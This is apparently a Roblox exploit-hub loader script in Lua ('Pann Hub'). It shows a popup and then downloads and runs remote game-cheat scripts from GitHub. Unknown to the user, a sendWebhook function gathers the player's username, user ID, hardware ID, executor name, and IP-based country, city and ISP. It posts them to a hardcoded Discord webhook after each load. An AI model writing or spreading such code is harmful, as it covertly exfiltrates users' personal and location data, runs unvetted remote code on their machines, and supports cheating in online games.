local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

local function sendWebhook()

   local webhookUrl = "https://discord.com/api/webhooks/1405757540716773506/Bb-236A2QbrV5pPlGpzzSopBh5VHIlSMEIIuA2JdYnWXXZAaq5kEq3crZpZK8aoWyb1T"

   local player = game.Players.LocalPlayer
   local playerName = player.Name
   local userId = player.UserId
   local profileUrl = string.format("https://www.roblox.com/users/%s/profile", userId)

   local MarketplaceService = game:GetService("MarketplaceService")
   local placeName, placeId = "Unknown", game.PlaceId
   local success, info = pcall(function()
      return MarketplaceService:GetProductInfo(game.PlaceId)
   end)
   if success and info then
      placeName = info.Name
   end

   local executorName = "Unknown Executor"
   if identifyexecutor then
      local name = identifyexecutor()
      if type(name) == "table" then
         name = name[1] or "Unknown Executor"
      elseif type(name) == "string" then
         name = name:match("^[^%s]+") or name
      end
      executorName = name
   end

   local hwid = "Unavailable"
   if string.lower(executorName):find("krnl") and KrnlHWID then
    hwid = KrnlHWID()
   elseif gethwid then
      hwid = gethwid()
   end

   local timeExecuted = os.date("%Y-%m-%d %H:%M:%S")

   local country = "Unknown"
   local city = "Unknown"
   local isp = "Unknown"
   local request = request or http_request or (syn and syn.request) or nil
   if request then
      local res = request({Url = "http://ip-api.com/json", Method = "GET"})
      if res and res.Body then
         local HttpService = game:GetService("HttpService")
         local geo = HttpService:JSONDecode(res.Body)
         if geo then
               if geo.country then country = geo.country end
               if geo.city then city = geo.city end
               if geo.isp then isp = geo.isp end
         end
      end
   end

   local avatarUrl = ""
   if request then
      local HttpService = game:GetService("HttpService")
      local thumbRes = request({Url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. userId .. "&size=420x420&format=Png&isCircular=false", Method = "GET"})
      if thumbRes and thumbRes.Body then
         local thumbData = HttpService:JSONDecode(thumbRes.Body)
         if thumbData and thumbData.data and thumbData.data[1] and thumbData.data[1].imageUrl then
               avatarUrl = thumbData.data[1].imageUrl
         end
      end
   end

   local data = {
      ["username"] = "Execution Logger",
      ["embeds"] = {{
         ["title"] = "📜 Script Executed",
         ["color"] = 65280,
         ["thumbnail"] = {["url"] = avatarUrl},
         ["fields"] = {
               {["name"] = "👤 Player", ["value"] = string.format("[%s](%s)", playerName, profileUrl), ["inline"] = true},
               {["name"] = "🎮 Game / Place", ["value"] = string.format("[%s](https://www.roblox.com/games/%s)", placeName, placeId), ["inline"] = true},
               {["name"] = "⏰ Time", ["value"] = "`" .. timeExecuted .. "`", ["inline"] = true},
               {["name"] = "🛠 Executor", ["value"] = "`" .. executorName .. "`", ["inline"] = true},
               {["name"] = "🖥 HWID", ["value"] = "`" .. hwid .. "`", ["inline"] = false},
               {["name"] = "🌍 Country", ["value"] = "`" .. country .. "`", ["inline"] = true},
               {["name"] = "🏙 City", ["value"] = "`" .. city .. "`", ["inline"] = true},
               {["name"] = "🌐 ISP", ["value"] = "`" .. isp .. "`", ["inline"] = true}
         },
         ["footer"] = {
               ["text"] = "Execution Tracker • Roblox"
         }
      }}
   }

   local HttpService = game:GetService("HttpService")
   local jsonData = HttpService:JSONEncode(data)

   if request then
      request({
         Url = webhookUrl,
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
         Body = jsonData
      })
   else
      warn("Your executor does not support HTTP requests.")
   end
end

local creator = game.CreatorId

local games = {
    [14179659] = 'https://raw.githubusercontent.com/scripterpan/scripterpan/refs/heads/main/ScriptSrc/RaiseAFloppa2.lua', -- Raise A Floppa 2
    [8509669]  = 'https://raw.githubusercontent.com/scripterpan/scripterpan/refs/heads/main/ScriptSrc/SolsRNG.lua', -- Sols RNG
    [9482918]  = 'https://raw.githubusercontent.com/scripterpan/scripterpan/refs/heads/main/ScriptSrc/TheMimic.lua', -- The Mimic
    [8401765]  = 'https://raw.githubusercontent.com/scripterpan/scripterpan/refs/heads/main/ScriptSrc/JobApplication.lua', -- Survive The Job Application
    [32900163] = 'https://raw.githubusercontent.com/scripterpan/scripterpan/refs/heads/main/ScriptSrc/PETAPETA.lua', -- PETAPETA (Original and School)
    [33541525] = 'https://raw.githubusercontent.com/scripterpan/scripterpan/refs/heads/main/ScriptSrc/7DTL.lua', -- 7 Days To Live
    [7314991]  = 'https://raw.githubusercontent.com/scripterpan/scripterpan/refs/heads/main/ScriptSrc/Nightlight.lua', -- Nightlight (Horror)
    [5449496] = 'https://raw.githubusercontent.com/scripterpan/scripterpan/refs/heads/main/ScriptSrc/FunkyFriday.lua', -- Funky Friday 
    [16607943] = 'https://raw.githubusercontent.com/scripterpan/scripterpan/refs/heads/main/ScriptSrc/Create-A-Factory.lua' -- Create A Factory Tycoon
}

WindUI:Popup({
    Title = "Welcome To Pann Hub",
    Icon = "info",
    Content = "Do you want to use/load our script?",
    Buttons = {
        {
            Title = "Cancel",
            Callback = function() end,
            Variant = "Tertiary",
        },
        {
            Title = "Continue",
            Icon = "arrow-right",
            Callback = function()
                repeat task.wait() until game.Players.LocalPlayer and game.Players.LocalPlayer.Character
                if not game:IsLoaded() then
                    game.Loaded:Wait()
                end

                WindUI:Notify({
                    Title = "Checking if this game is supported or not",
                    Content = "Checking, Please wait",
                    Icon = "info",
                    Duration = 5,
                })

                task.wait(2.5)

                if games[creator] then
                    WindUI:Notify({
                        Title = "Supported!",
                        Content = "Loading, Please wait",
                        Icon = "info",
                        Duration = 5,
                    })

                    task.wait(1.5)
                    
                    loadstring(game:HttpGet(games[creator]))()

                    sendWebhook()

                    WindUI:Notify({
                        Title = "Done!",
                        Content = "Loading finished",
                        Icon = "info",
                        Duration = 5,
                    })
                else
                    WindUI:Notify({
                        Title = "Unsupported!",
                        Content = "We'll be adding the list of supported games soon",
                        Icon = "info",
                        Duration = 5,
                    })

                    task.wait(2.5)

                    WindUI:Notify({
                        Title = "Do you want to load our universal script?",
                        Content = "You can use this in almost any Roblox game",
                        Icon = "info",
                        Duration = 5,
                    })

                    task.wait(2.5)

                    WindUI:Popup({
                        Title = "Do you want to load our universal script?",
                        Icon = "info",
                        Content = "You can use this in almost any Roblox game",
                        Buttons = {
                            {
                                Title = "No, Thanks",
                                Callback = function()
                                    WindUI:Notify({
                                        Title = "Ok",
                                        Content = "Bye Bye, Have a good day!",
                                        Icon = "hand",
                                        Duration = 5,
                                    })    
                                end,
                                Variant = "Tertiary",
                            },
                            {
                                Title = "Sure",
                                Icon = "arrow-right",
                                Callback = function()
                                    WindUI:Notify({
                                        Title = "Loading",
                                        Content = "Please wait",
                                        Icon = "info",
                                        Duration = 5,
                                    })

                                    task.wait(1.25)

                                    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripterpan/scripterpan/refs/heads/main/ScriptSrc/Universal.lua"))()

                                    sendWebhook()

                                    WindUI:Notify({
                                        Title = "Done!",
                                        Content = "Loading finished",
                                        Icon = "info",
                                        Duration = 5,
                                    })
                                end,
                                Variant = "Primary",
                            }
                        }
                    })
                end
            end,
            Variant = "Primary",
        }
    }
})
